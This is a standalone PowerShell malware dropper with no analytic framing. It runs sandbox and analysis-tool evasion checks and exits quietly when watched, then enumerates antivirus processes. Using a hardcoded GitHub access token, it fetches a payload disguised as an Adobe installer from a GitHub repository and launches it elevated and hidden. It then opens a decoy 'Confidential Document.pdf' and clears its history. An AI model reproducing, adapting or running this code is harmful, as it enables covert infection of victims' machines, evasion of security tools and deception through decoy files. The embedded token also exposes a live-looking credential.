$ErrorActionPreference = 'SilentlyContinue'
$state = New-Object System.Collections.ArrayList

$sb = $false
$cs  = Get-WmiObject Win32_ComputerSystem
$mem = $cs.TotalPhysicalMemory
$cpu = (Get-WmiObject Win32_Processor).NumberOfCores

if ($cs.Model -match 'VirtualBox|VMware|QEMU|Xen|Virtual Machine') { $sb = $true }
if ($mem -lt 2GB)  { $sb = $true }
if ($cpu -lt 2)    { $sb = $true }
if ($env:USERNAME -eq 'Bruno') { $sb = $true }

$toolProcs = 'vboxservice|vboxtray|VGAuthService|vmtoolsd|SbieSvc|Procmon|proc_exp|wireshark|dumpcap|ollydbg|x64dbg|ida64|fakenet|windbg'
if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }

[void]$state.Add("sandbox=$sb")
[void]$state.Add("ram=$mem")
[void]$state.Add("cores=$cpu")

if ($sb) {
    [void]$state.Add('state=sandbox-exit')
    $state | Out-File (Join-Path $env:TEMP 'value.txt')
    Clear-History
    exit
}

$avProcs = 'MsMpEng|avp|avgnt|avguard|ekrn|bdagent|ccSvcHst|mbamservice|NortonSecurity|V3Svc|SAVService|McAfeeFramework'
$found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
    Select-Object -ExpandProperty Name -Unique)
[void]$state.Add("av=$($found -join ',')")

[void]$state.Add('state=ok')
$state | Out-File (Join-Path $env:TEMP 'value.txt')

$GhToken = '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'
$DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
$DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/AdobeCreativeCloudInstaller.exe'
$wrapperPath = Join-Path $env:TEMP 'AdobeCreativeCloudInstaller.exe'

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}

    # Download signed wrapper
    $resp = Invoke-RestMethod -Uri $wrapperApi -Headers $hdrs
    [IO.File]::WriteAllBytes($wrapperPath, [Convert]::FromBase64String($resp.content))
    Unblock-File -Path $wrapperPath

    # Run wrapper - UAC shows with publisher name
    $proc = Start-Process $wrapperPath -Verb RunAs -WindowStyle Hidden -PassThru -Wait

    if ($proc.ExitCode -eq 0) {
        # Open decoy
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
        $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
        [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
    }
} catch {}

Clear-History